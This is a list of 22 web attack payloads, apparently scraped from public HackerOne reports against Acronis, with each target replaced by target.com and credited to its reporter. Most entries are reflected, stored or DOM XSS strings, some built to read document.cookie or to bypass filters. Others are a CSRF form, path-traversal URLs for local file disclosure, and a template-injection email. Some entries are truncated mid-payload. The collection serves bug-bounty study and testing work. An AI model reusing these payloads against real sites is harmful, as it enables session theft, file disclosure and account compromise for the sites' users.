# Acronis

22 payloads.

### `cd8f0750`

```
http://target.com/files/glidownload/verify.asp?version=AC12%27%3E%3Cimg%20src=v%20onerror=alert(document.domain
```

**Parameter:** `version`
— [Reflected XSS on http://target.com/files/glidownload/verify.asp](https://hackerone.com/reports/859395) · Acronis · [ali](https://hackerone.com/ali)

### `d52313c7`

```
### Affected Endpoint for read files:

* https://target.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `textdomain`
— [Local File Disclosure /Delete On \[target.com\]](https://hackerone.com/reports/924407) · Acronis · [10nf](https://hackerone.com/10nf)

### `f39ac821`

```
https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
```

**Parameter:** `lang`
— [Local File Disclosure /Delete On \[target.com\]](https://hackerone.com/reports/924407) · Acronis · [10nf](https://hackerone.com/10nf)

### `53980bb8`

```
5. Name the plan with this payload "/><svg/onload=prompt(document.domain)>
```

— [Stored XSS in backup scanning plan name](https://hackerone.com/reports/961046) · Acronis · [sbakhour](https://hackerone.com/sbakhour) · $500.0

### `46ddde23`

```
12. Select the plan create with the payload "/><svg/onload=prompt(document.domain)>
```

— [Stored XSS in backup scanning plan name](https://hackerone.com/reports/961046) · Acronis · [sbakhour](https://hackerone.com/sbakhour) · $500.0

### `eac45cc9`

```
<form action=https://target.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
```

— [CSRF and XSS on target.com](https://hackerone.com/reports/961787) · Acronis · [cabelo](https://hackerone.com/cabelo)

### `77996b62`

```
1. go to:                                                                                                                                                                                                                                                                                                                                                                                                                                                   ];prompt();var%20asd=[{%27foo%27:%27bar
```

**Parameter:** `x-uid`
— [DOM based XSS in target.com/<id>/purl-corporate-standard-IT \[cfg parameter\]](https://hackerone.com/reports/968690) · Acronis · [f_m](https://hackerone.com/f_m) · $50.0

### `c4367597`

```
https://target.com/admin/su/?Error=%3cscript%3ealert(document.domain
```

**Parameter:** `Error`
— [Reflected XSS via "Error" parameter on https://target.com/admin/su/](https://hackerone.com/reports/970878) · Acronis · [samincube](https://hackerone.com/samincube) · $50.0

### `e134d983`

```
https://target.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
```

**Parameter:** `-back`
— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)

### `8d0e8e6f`

```
"><img src=x onerror=alert(1)><x y="
```

— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)

### `35cac2d0`

```
\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
```

— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)

### `b775a3e5`

```
2- enter this javascript   code    "><script>alert(1);</script>     in  form field
```

— [Cross Site Scripting (Reflected) on https://target.com/dotaznik/roadshow-2020/](https://hackerone.com/reports/1081747) · Acronis · [darkdream](https://hackerone.com/darkdream) · $50.0

### `2177f779`

```
<img src=x onerror=alert(document.cookie)>
```

**Parameter:** `city`
— [Stored Cross-site Scripting on target.com/forum/](https://hackerone.com/reports/1122513) · Acronis · [h4x0r_dz](https://hackerone.com/h4x0r_dz)

### `95de6053`

```
<script>alert(0)</script>
```

**Parameter:** `nickname`
— [Cross-site Scripting (XSS) - Stored | target.com](https://hackerone.com/reports/1161241) · Acronis · [quadrant](https://hackerone.com/quadrant)

### `757b5b7b`

```
Payload 1:
----------
<h1 onmouseover=alert(document.domain)>XSS</h1>

Payload 2:
----------
<img src=x onerror=alert(1)>
```

**Parameter:** `promo_code`
— [Stored Cross Site Scripting at http://target.com/ADMIN/store/index.cfm?fa=disprocode](https://hackerone.com/reports/1164853) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)

### `b3292ef6`

```
Payload 1: Mouse Over XSS
---------------------------
%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>


Payload 2: 
---------
%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

**Parameter:** `userPage`
— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)

### `2d077d97`

```
http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>

http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

**Parameter:** `userPage`
— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)

### `df1289b3`

```
PoC 1:
http://target.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Ch1+onmouseover=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC 2:
http://target.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\16
```

**Parameter:** `serial`
— [Reflected Cross Site Scripting at http://target.com/files/glidownload/verify3.asp \[Uppercase Filter Bypass\]](https://hackerone.com/reports/1167034) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)

### `4c2aa729`

```
1. Open [                                             ] and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com
```

**Parameter:** `email`
— [Self-DoS due to template injection via email field in password reset form on target.com](https://hackerone.com/reports/1265344) · Acronis · [sudo_bash](https://hackerone.com/sudo_bash)

### `5b1479eb`

```
<img src=x onerror=alert(/Stored_XSS/)>
```

— [Stored XSS in plan name field (Acronis Cyber Protect)](https://hackerone.com/reports/1940788) · Acronis · [und3sc0n0c1d0](https://hackerone.com/und3sc0n0c1d0)

### `3d2567d2`

```
https://target.com/portal/login-callback?redirectUrl=javascript:alert(document.domain
```

**Parameter:** `redirectUrl`
— [ Potential XSS Vulnerability in Acronis Login Callback URL](https://hackerone.com/reports/2611305) · Acronis · [kindone](https://hackerone.com/kindone)

### `29a9a6af`

```
https://target.com/portal/licensing-check?redirect_url=javascript:alert(document.domain
```

**Parameter:** `redirect_url`
— [Potential XSS in redirect_url Parameter](https://hackerone.com/reports/2653342) · Acronis · [kindone](https://hackerone.com/kindone)
